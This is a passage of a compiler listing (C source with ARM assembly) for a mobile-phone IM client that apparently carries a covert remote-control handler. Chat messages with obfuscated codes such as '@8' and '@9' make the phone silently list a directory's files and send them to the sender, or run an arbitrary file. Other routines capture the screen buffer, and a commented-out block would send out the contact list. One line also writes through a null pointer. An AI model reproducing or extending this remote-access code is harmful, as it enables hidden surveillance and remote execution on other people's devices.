   \   000003A8   00B080E5           STR      R11,[R0, #+0]
   \   000003AC   64029FE5           LDR      R0,??CheckComand2_0+0x44  ;; ipc_xtask_name
    262                gipc.name_from=ipc_my_name;
    263                gipc.data=0;
   \   000003B0   089083E5           STR      R9,[R3, #+8]
   \   000003B4   000083E5           STR      R0,[R3, #+0]
   \   000003B8   5C029FE5           LDR      R0,??CheckComand2_0+0x48  ;; ipc_my_name
    264                GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_XTASK_IDLE,&gipc);    
   \   000003BC   0B20A0E1           MOV      R2,R11
   \   000003C0   040083E5           STR      R0,[R3, #+4]
   \   000003C4   B010A0E3           MOV      R1,#+176
   \   000003C8   DE1C81E3           ORR      R1,R1,#0xDE00
   \   000003CC   0900A0E3           MOV      R0,#+9
   \   000003D0   420C80E3           ORR      R0,R0,#0x4200
   \   000003D4   000100EF           SWI      +256
    265                return;    
   \   000003D8   4FFFFFEA           B        ??CheckComand2_4
    266              }
    267          
    268              
    269              if(/*strstr(txt,"#disconnect") ||*/ strstr(txt,_DISCONNECT))
   \                     ??CheckComand2_20:
   \   000003DC   811F8FE2           ADR      R1,??CheckComand2_0+0x14  ;; "@5"
   \   000003E0   0400A0E1           MOV      R0,R4
   \   000003E4   180100EF           SWI      +280
   \   000003E8   000050E3           CMP      R0,#+0
   \   000003EC   0F00000A           BEQ      ??CheckComand2_21
    270              {
    271                comanda=0;
    272                disautorecconect=1;
   \   000003F0   28029FE5           LDR      R0,??CheckComand2_0+0x4C  ;; disautorecconect
   \   000003F4   00908AE5           STR      R9,[R10, #+0]
   \   000003F8   00B080E5           STR      R11,[R0, #+0]
    273                t->signals=0;
   \   000003FC   749085E5           STR      R9,[R5, #+116]
    274                SENDMSGCOUNT++;
   \   00000400   000097E5           LDR      R0,[R7, #+0]
   \   00000404   010080E2           ADD      R0,R0,#+1
   \   00000408   000087E5           STR      R0,[R7, #+0]
    275          #ifdef kluchnik
    276          #else
    277                void end_socket(void);
    278                SUBPROC((void*)end_socket);
   \   0000040C   10029FE5           LDR      R0,??CheckComand2_0+0x50  ;; end_socket
   \   00000410   710100EF           SWI      +369
    279          #endif
    280                return;
   \   00000414   40FFFFEA           B        ??CheckComand2_4
   \                     ??CheckComand2_2:
   \   00000418   40313300           DC8      "@13"
   \   0000041C   40313100           DC8      "@11"
   \   00000420   40313200           DC8      "@12"
   \   00000424   40310000           DC8      "@1",+0
   \   00000428   20000000           DC8      " ",+0,+0
   \   0000042C   21000000           DC8      "!",+0,+0
    281              }    
   \                     ??CheckComand2_21:
   \   00000430   6D1F8FE2           ADR      R1,??CheckComand2_0+0x18  ;; "@8"
   \   00000434   0400A0E1           MOV      R0,R4
    282             
    283            //  if(/*strstr(txt,"#getclistall") || */strstr(txt,_GETCLISTALL))
    284          /*    {
    285                CLIST *tt;
    286                tt=(CLIST *)(&cltop);
    287                char *s=malloc(16384);
    288                *s=0;
    289                char ss[64];
    290                char *q;
    291                while(tt=(CLIST *)(tt->next))
    292                 {
    293                  if(!tt->isgroup)
    294                   {
    295                     q=GetStatusByIconIndex(GetIconIndex(tt));
    296                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
    297                     strcat(s,ss);
    298                   }
    299                 }
    300          #ifdef kluchnik
    301                AddStringToLog(t,0x01,"Sending contact list all...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    302                SendData(t,s,ENA_SIGNAL,0);
    303          #else
    304                SendData(t,s,DIS_SIGNAL,1);
    305          #endif
    306                mfree(s);
    307                return;
    308              }*/
    309             
    310            //  if(/*strstr(txt,"#getclist") || */strstr(txt,_GETCLIST))
    311            /*  {
    312                CLIST *tt;
    313                tt=(CLIST *)(&cltop);
    314                char *s=malloc(16384);
    315                *s=0;
    316                char ss[64];
    317                char *q;
    318                while(tt=(CLIST *)(tt->next))
    319                 {
    320                  if(tt->state!=0xFFFF && !tt->isgroup)
    321                   {
    322                     q=GetStatusByIconIndex(GetIconIndex(tt));
    323                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
    324                     strcat(s,ss);
    325                   }
    326                 }
    327          #ifdef kluchnik
    328                AddStringToLog(t,0x01,"Sending contact list online...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    329                SendData(t,s,ENA_SIGNAL,0);
    330          #else
    331                SendData(t,s,DIS_SIGNAL,1);
    332          #endif      
    333                mfree(s);
    334                return;
    335              }
    336              */
    337           
    338             
    339              if(/*strstr(txt,"#getflist") || */strstr(txt,_GETFLIST))
   \   00000438   180100EF           SWI      +280
   \   0000043C   000050E3           CMP      R0,#+0
   \   00000440   4800000A           BEQ      ??CheckComand2_22
    340               {
    341                 DIR_ENTRY de;
    342                 unsigned int err;
    343                 char *s=malloc(16384);
   \   00000444   400CA0E3           MOV      R0,#+16384
   \   00000448   140000EF           SWI      +20
   \   0000044C   0060A0E1           MOV      R6,R0
    344                 char *path=malloc(256);
   \   00000450   400FA0E3           MOV      R0,#+256
   \   00000454   140000EF           SWI      +20
   \   00000458   00A0A0E1           MOV      R10,R0
    345                 char p[64];
    346                 if(strstr(txt,_GETFLIST))
   \   0000045C   621F8FE2           ADR      R1,??CheckComand2_0+0x18  ;; "@8"
   \   00000460   0400A0E1           MOV      R0,R4
   \   00000464   180100EF           SWI      +280
   \   00000468   000050E3           CMP      R0,#+0
   \   0000046C   0300000A           BEQ      ??CheckComand2_23
    347                   sprintf(path,per_s,txt+3);
   \   00000470   B0119FE5           LDR      R1,??CheckComand2_0+0x54  ;; per_s
   \   00000474   032084E2           ADD      R2,R4,#+3
   \   00000478   0A00A0E1           MOV      R0,R10
   \   0000047C   160000EF           SWI      +22
    348               /*  else
    349                   sprintf(path,per_s,txt+strlen("#getflist")+1);*/
    350                 char *ptr=path+strlen(path)+1;
   \                     ??CheckComand2_23:
   \   00000480   0A00A0E1           MOV      R0,R10
   \   00000484   1B0000EF           SWI      +27
   \   00000488   0A0080E0           ADD      R0,R0,R10
   \   0000048C   01B080E2           ADD      R11,R0,#+1
    351                 strcat(path,"\\*.*");
   \   00000490   401088E2           ADD      R1,R8,#+64
   \   00000494   0A00A0E1           MOV      R0,R10
   \   00000498   170000EF           SWI      +23
    352                 *s=0;
   \   0000049C   0090C6E5           STRB     R9,[R6, #+0]
    353                 if(FindFirstFile(&de,path,&err))
   \   000004A0   0D20A0E1           MOV      R2,SP
   \   000004A4   0A10A0E1           MOV      R1,R10
   \   000004A8   28008DE2           ADD      R0,SP,#+40
   \   000004AC   6B0000EF           SWI      +107
   \   000004B0   000050E3           CMP      R0,#+0
   \   000004B4   1300000A           BEQ      ??CheckComand2_24
    354                  {
    355                   do
    356                   {
    357                     strcpy(ptr,de.file_name);  
   \                     ??CheckComand2_25:
   \   000004B8   DD108DE2           ADD      R1,SP,#+221
   \   000004BC   0B00A0E1           MOV      R0,R11
   \   000004C0   1A0000EF           SWI      +26
    358                     if (de.file_attr&FA_DIRECTORY)
   \   000004C4   F405DDE1           LDRSH    R0,[SP, #+84]
   \   000004C8   DD208DE2           ADD      R2,SP,#+221
   \   000004CC   100010E3           TST      R0,#0x10
    359                       sprintf(p,"\\%s\r\n",de.file_name);
   \   000004D0   48108812           ADDNE    R1,R8,#+72
    360                     else
    361                      sprintf(p," %s\r\n",de.file_name);
   \   000004D4   50108802           ADDEQ    R1,R8,#+80
   \   000004D8   6C008DE2           ADD      R0,SP,#+108
   \   000004DC   400E80E2           ADD      R0,R0,#+1024
   \   000004E0   160000EF           SWI      +22
    362                      strcat(s,p);
   \   000004E4   6C108DE2           ADD      R1,SP,#+108
   \   000004E8   401E81E2           ADD      R1,R1,#+1024
   \   000004EC   0600A0E1           MOV      R0,R6
   \   000004F0   170000EF           SWI      +23
    363                   }
    364                   while(FindNextFile(&de,&err));
   \   000004F4   0D10A0E1           MOV      R1,SP
   \   000004F8   28008DE2           ADD      R0,SP,#+40
   \   000004FC   6C0000EF           SWI      +108
   \   00000500   000050E3           CMP      R0,#+0
   \   00000504   EBFFFF1A           BNE      ??CheckComand2_25
    365                  }
    366                 FindClose(&de,&err);
   \                     ??CheckComand2_24:
   \   00000508   0D10A0E1           MOV      R1,SP
   \   0000050C   28008DE2           ADD      R0,SP,#+40
   \   00000510   6D0000EF           SWI      +109
    367                 mfree(path);
   \   00000514   0A00A0E1           MOV      R0,R10
   \   00000518   150000EF           SWI      +21
    368                 if(!s) sprintf(s,"dr ( %s ) n f",txt+strlen(_GETFLIST)+1);
   \   0000051C   000056E3           CMP      R6,#+0
   \   00000520   0600001A           BNE      ??CheckComand2_26
   \   00000524   300F8FE2           ADR      R0,??CheckComand2_0+0x18  ;; "@8"
   \   00000528   1B0000EF           SWI      +27
   \   0000052C   040080E0           ADD      R0,R0,R4
   \   00000530   012080E2           ADD      R2,R0,#+1
   \   00000534   581088E2           ADD      R1,R8,#+88
   \   00000538   0000A0E3           MOV      R0,#+0
   \   0000053C   160000EF           SWI      +22
    369            
    370            #ifdef kluchnik
    371                 char *ss=malloc(256);
    372                 sprintf(ss,"Recive command < Get files from directory %s >",txt+strlen(_GETFLIST)+1);
    373                 AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    374                 if(SHOW_ACTIVE)
    375                   t->isactive=ACTIVE_TIME;
    376                 SendData(t,s,ENA_SIGNAL,0);
    377                 mfree(ss);
    378            #else
    379                 SENDMSGCOUNT++;
   \                     ??CheckComand2_26:
   \   00000540   000097E5           LDR      R0,[R7, #+0]
    380                 SendData(t,s,DIS_SIGNAL,0);
   \   00000544   0030A0E3           MOV      R3,#+0
   \   00000548   010080E2           ADD      R0,R0,#+1
   \   0000054C   000087E5           STR      R0,[R7, #+0]
   \   00000550   0320A0E1           MOV      R2,R3
   \   00000554   0610A0E1           MOV      R1,R6
   \   00000558   0500A0E1           MOV      R0,R5
   \   0000055C   ........           _BLF     SendData,??SendData??rA
    381            #endif      
    382                 mfree(s);
   \   00000560   0600A0E1           MOV      R0,R6
   \   00000564   56FFFFEA           B        ??CheckComand2_15
    383                 return;
    384               }
    385                
    386             if(/*strstr(txt,"#runfile") ||*/ strstr(txt,_RUNFILE))
   \                     ??CheckComand2_22:
   \   00000568   206F8FE2           ADR      R6,??CheckComand2_0+0x1C  ;; "@9"
   \   0000056C   0610A0E1           MOV      R1,R6
   \   00000570   0400A0E1           MOV      R0,R4
   \   00000574   180100EF           SWI      +280
   \   00000578   000050E3           CMP      R0,#+0
   \   0000057C   1100000A           BEQ      ??CheckComand2_1
    387             {   
    388          #ifdef kluchnik
    389               char *ss=malloc(256);
    390               sprintf(ss,"Recive command < Run file %s >",txt+strlen(_RUNFILE)+1);
    391               AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
    392               SendData(t,"File was been runned!!",ENA_SIGNAL,0);
    393               mfree(ss);
    394          #else
    395               int i=0;
    396               if(strstr(txt,_RUNFILE)) i=start(txt+3);
   \   00000580   0610A0E1           MOV      R1,R6
   \   00000584   0400A0E1           MOV      R0,R4
   \   00000588   180100EF           SWI      +280
   \   0000058C   000050E3           CMP      R0,#+0
   \   00000590   0700000A           BEQ      ??CheckComand2_27
    397             //  else i=start(txt+strlen("#runfile")+1);
    398                  
    399               if(i)
   \   00000594   030084E2           ADD      R0,R4,#+3
   \   00000598   ........           BL       start
   \   0000059C   000050E3           CMP      R0,#+0
   \   000005A0   0300000A           BEQ      ??CheckComand2_27
    400                 SendData(t,"run!",DIS_SIGNAL,1);
   \   000005A4   0130A0E3           MOV      R3,#+1
   \   000005A8   0920A0E1           MOV      R2,R9
   \   000005AC   681088E2           ADD      R1,R8,#+104
   \   000005B0   020000EA           B        ??CheckComand2_17
    401               else
    402                 SendData(t,"nrun!",DIS_SIGNAL,1);
   \                     ??CheckComand2_27:
   \   000005B4   0130A0E3           MOV      R3,#+1
   \   000005B8   0920A0E1           MOV      R2,R9
   \   000005BC   701088E2           ADD      R1,R8,#+112
   \                     ??CheckComand2_17:
   \   000005C0   0500A0E1           MOV      R0,R5
   \   000005C4   ........           _BLF     SendData,??SendData??rA
   \                     ??CheckComand2_1:
   \   000005C8   ACD08DE2           ADD      SP,SP,#+172
   \   000005CC   40DE8DE2           ADD      SP,SP,#+1024
   \   000005D0   F08FBDE8           POP      {R4-R11,PC}      ;; return
   \                     ??CheckComand2_0:
   \   000005D4   49620000           DC8      "Ib",+0
   \   000005D8   40320000           DC8      "@2",+0
   \   000005DC   40330000           DC8      "@3",+0
   \   000005E0   61637400           DC8      "act"
   \   000005E4   40340000           DC8      "@4",+0
   \   000005E8   40350000           DC8      "@5",+0
   \   000005EC   40380000           DC8      "@8",+0
   \   000005F0   40390000           DC8      "@9",+0
   \   000005F4   ........           DC32     comanda
   \   000005F8   ........           DC32     SENDMSGCOUNT
   \   000005FC   ........           DC32     SendAnswer
   \   00000600   ........           DC32     ElfKiller
   \   00000604   ........           DC32     `?<Constant "@Ms s: %s">`
   \   00000608   ........           DC32     vibra_count
   \   0000060C   ........           DC32     VIBR_TYPE
   \   00000610   ........           DC32     silenthide
   \   00000614   ........           DC32     gipc
   \   00000618   ........           DC32     ipc_xtask_name
   \   0000061C   ........           DC32     ipc_my_name
   \   00000620   ........           DC32     disautorecconect
   \   00000624   ........           DC32     end_socket
   \   00000628   ........           DC32     per_s
    403          #endif
    404               return;
    405             }   
    406           }//if(txt[0]=='#' && t->remoteAccess!=4)
    407          }
    408          
    409          
    410          
    411          extern int hy;
    412          extern IMGHDR *icons[];

   \                                 In segment DATA_I, align 4, align-sorted
    413          IMGHDR screen={0,0,8,""};
   \                     screen:
   \   00000000                      DS8 8
   \   00000008                      REQUIRE `?<Initializer for screen>`

   \                                 In segment CODE, align 4, keep-with-next
    414          void DoScreen()
    415          {
   \                     DoScreen:
   \   00000000   F0412DE9           PUSH     {R4-R8,LR}
    416            int SCREENSIZE = ScreenH()*ScreenW();
    417          //  int h=(icons[IS_ONLINE]->h > FontH(clfont)) ? (icons[IS_ONLINE]->h) : (FontH(clfont));
    418           // int hy=(icons[IS_ONLINE]->h > FontH(108)) ? (icons[IS_ONLINE]->h) : (FontH(108));
    419            int HSIZE = (hy+2)*ScreenW();
   \   00000004   ........           LDR      R5,??DataTable1  ;; hy
    420            int ScrH=ScreenH()-(hy+2);
    421            int ScrW=ScreenW();
    422            char *ms=RamScreenBuffer();
    423            screen.w=ScrW;
   \   00000008   60809FE5           LDR      R8,??DoScreen_0  ;; screen
   \   0000000C   898100EF           SWI      +33161
   \   00000010   888100EF           SWI      +33160
   \   00000014   888100EF           SWI      +33160
   \   00000018   001095E5           LDR      R1,[R5, #+0]
   \   0000001C   021081E2           ADD      R1,R1,#+2
   \   00000020   900104E0           MUL      R4,R0,R1
   \   00000024   898100EF           SWI      +33161
   \   00000028   001095E5           LDR      R1,[R5, #+0]
   \   0000002C   010040E0           SUB      R0,R0,R1
   \   00000030   025040E2           SUB      R5,R0,#+2
   \   00000034   888100EF           SWI      +33160
   \   00000038   0060A0E1           MOV      R6,R0
   \   0000003C   E08000EF           SWI      +32992
   \   00000040   0070A0E1           MOV      R7,R0
    424            screen.h=ScrH;
    425            screen.bitmap=malloc(ScrW*ScrH*2);
   \   00000044   950600E0           MUL      R0,R5,R6
   \   00000048   0060C8E5           STRB     R6,[R8, #+0]
   \   0000004C   0150C8E5           STRB     R5,[R8, #+1]
   \   00000050   8050A0E1           LSL      R5,R0,#+1
   \   00000054   0500A0E1           MOV      R0,R5
   \   00000058   140000EF           SWI      +20
   \   0000005C   040088E5           STR      R0,[R8, #+4]
    426            ms+=(HSIZE*2);
    427            memcpy(screen.bitmap, ms, ScrW*ScrH*2);
   \   00000060   0520A0E1           MOV      R2,R5
   \   00000064   841087E0           ADD      R1,R7,R4, LSL #+1
   \   00000068   1E0100EF           SWI      +286
    428          }
   \   0000006C   F081BDE8           POP      {R4-R8,PC}       ;; return
   \                     ??DoScreen_0:
   \   00000070   ........           DC32     screen
    429          

   \                                 In segment DATA_I, align 4, align-sorted
    430          IMGHDR screen2={0,0,8,""};
   \                     screen2:
   \   00000000                      DS8 8
   \   00000008                      REQUIRE `?<Initializer for screen2>`

   \                                 In segment CODE, align 4, keep-with-next
    431          void DoScreen2()
    432          {
   \                     DoScreen2:
   \   00000000   F0412DE9           PUSH     {R4-R8,LR}
    433            int SCREENSIZE = ScreenH()*ScreenW();
    434            int HSIZE = (hy+2)*ScreenW();
   \   00000004   ........           LDR      R5,??DataTable1  ;; hy
    435            int ScrH=ScreenH()-(hy+2);
    436            int ScrW=ScreenW();
    437            char *ms=RamScreenBuffer();
    438            screen2.w=ScrW;
   \   00000008   60809FE5           LDR      R8,??DoScreen2_0  ;; screen2
   \   0000000C   898100EF           SWI      +33161
   \   00000010   888100EF           SWI      +33160
   \   00000014   888100EF           SWI      +33160
   \   00000018   001095E5           LDR      R1,[R5, #+0]
   \   0000001C   021081E2           ADD      R1,R1,#+2
   \   00000020   900104E0           MUL      R4,R0,R1
   \   00000024   898100EF           SWI      +33161
   \   00000028   001095E5           LDR      R1,[R5, #+0]
   \   0000002C   010040E0           SUB      R0,R0,R1
   \   00000030   025040E2           SUB      R5,R0,#+2
   \   00000034   888100EF           SWI      +33160
   \   00000038   0060A0E1           MOV      R6,R0
   \   0000003C   E08000EF           SWI      +32992
   \   00000040   0070A0E1           MOV      R7,R0
    439            screen2.h=ScrH;
    440            screen2.bitmap=malloc(ScrW*ScrH*2);
   \   00000044   950600E0           MUL      R0,R5,R6
   \   00000048   0060C8E5           STRB     R6,[R8, #+0]
   \   0000004C   0150C8E5           STRB     R5,[R8, #+1]
   \   00000050   8050A0E1           LSL      R5,R0,#+1
   \   00000054   0500A0E1           MOV      R0,R5
   \   00000058   140000EF           SWI      +20
   \   0000005C   040088E5           STR      R0,[R8, #+4]
    441            ms+=(HSIZE*2);
    442            memcpy(screen2.bitmap, ms, ScrW*ScrH*2);
   \   00000060   0520A0E1           MOV      R2,R5
   \   00000064   841087E0           ADD      R1,R7,R4, LSL #+1
   \   00000068   1E0100EF           SWI      +286
    443          }
   \   0000006C   F081BDE8           POP      {R4-R8,PC}       ;; return
   \                     ??DoScreen2_0:
   \   00000070   ........           DC32     screen2

   \                                 In segment CODE, align 4, keep-with-next
   \                     ??DataTable1:
   \   00000000   ........           DC32     hy

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for screen>`:
   \   00000000   0000               DC8 0, 0
   \   00000002   0800               DC16 8
   \   00000004   ........           DC32 `?<Constant "">`

   \                                 In segment DATA_ID, align 4, align-sorted
   \                     `?<Initializer for screen2>`:
   \   00000000   0000               DC8 0, 0
   \   00000002   0800               DC16 8
   \   00000004   ........           DC32 `?<Constant "">`

   \                                 In segment DATA_C, align 1, align-sorted
   \                     `?<Constant "">`:
   \   00000000   00                 DC8 ""

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "NULL pointer function!">`:
   \   00000000   4E554C4C2070       DC8 "NULL pointer function!"
   \              6F696E746572
   \              2066756E6374
   \              696F6E2100  
   \   00000017   00                 DC8 0
   \   00000018   2530385800         DC8 "%08X"
   \   0000001D   000000             DC8 0, 0, 0

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313300           DC8 "@13"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313100           DC8 "@11"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   40313200           DC8 "@12"

   \                                 In segment DATA_C, align 4, align-sorted
   \                     `?<Constant "@Ms s: %s">`:
   \   00000000   404D7320733A       DC8 "@Ms s: %s"
   \              20257300    
   \   0000000A   0000               DC8 0, 0
   \   0000000C   6D205B202573       DC8 "m [ %s ] to [ %s ] n [ %s ] s."
   \              205D20746F20
   \              5B202573205D
   \              206E205B2025
   \              73205D20732E
   \              00          
   \   0000002B   00                 DC8 0
   \   0000002C   4D2025732073       DC8 "M %s snd"
   \              6E6400      
   \   00000035   000000             DC8 0, 0, 0
   \   00000038   7363722E2E00       DC8 "scr.."
   \   0000003E   0000               DC8 0, 0
   \   00000040   5C2A2E2A00         DC8 "\\*.*"
   \   00000045   000000             DC8 0, 0, 0
   \   00000048   5C25730D0A00       DC8 "\\%s\015\012"
   \   0000004E   0000               DC8 0, 0
   \   00000050   2025730D0A00       DC8 " %s\015\012"
   \   00000056   0000               DC8 0, 0
   \   00000058   647220282025       DC8 "dr ( %s ) n f"
   \              732029206E20
   \              6600        
   \   00000066   0000               DC8 0, 0
   \   00000068   72756E2100         DC8 "run!"
   \   0000006D   000000             DC8 0, 0, 0
   \   00000070   6E72756E2100       DC8 "nrun!"
   \   00000076   0000               DC8 0, 0

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403100             DC8 "@1"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   2100               DC8 "!"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   2000               DC8 " "

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   496200             DC8 "Ib"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403200             DC8 "@2"

   \                                 In segment DATA_C, align 4, align-sorted
   \   00000000   61637400           DC8 "act"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403300             DC8 "@3"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403400             DC8 "@4"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403500             DC8 "@5"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403800             DC8 "@8"

   \                                 In segment DATA_C, align 1, align-sorted
   \   00000000   403900             DC8 "@9"
    444          

   Maximum stack usage in bytes:

     Function     CSTACK
     --------     ------
     CheckComand2  1240
     DoScreen        24
     DoScreen2       24
     start           16


   Segment part sizes:

     Function/Label                 Bytes
     --------------                 -----
     start                           468
     CheckComand2                   1580
     screen                            8
     DoScreen                        116
     screen2                           8
     DoScreen2                       116
     ??DataTable1                      4
     ?<Initializer for screen>         8
     ?<Initializer for screen2>        8
     ?<Constant "">                    1
     ?<Constant "NULL pointer function!">
                                      32
     ?<Constant "@13">                 4
     ?<Constant "@11">                 4
     ?<Constant "@12">                 4
     ?<Constant "@Ms s: %s">         120
     ?<Constant "@1">                  3
     ?<Constant "!">                   2
     ?<Constant " ">                   2
     ?<Constant "Ib">                  3
     ?<Constant "@2">                  3
     ?<Constant "act">                 4
     ?<Constant "@3">                  3
     ?<Constant "@4">                  3
     ?<Constant "@5">                  3
     ?<Constant "@8">                  3
     ?<Constant "@9">                  3
      Others                          88

 
 2 360 bytes in segment CODE
   197 bytes in segment DATA_C
    16 bytes in segment DATA_I
    16 bytes in segment DATA_ID
    12 bytes in segment INITTAB
 
 2 284 bytes of CODE  memory (+ 88 bytes shared)
   213 bytes of CONST memory
    16 bytes of DATA  memory

Errors: none
Warnings: none
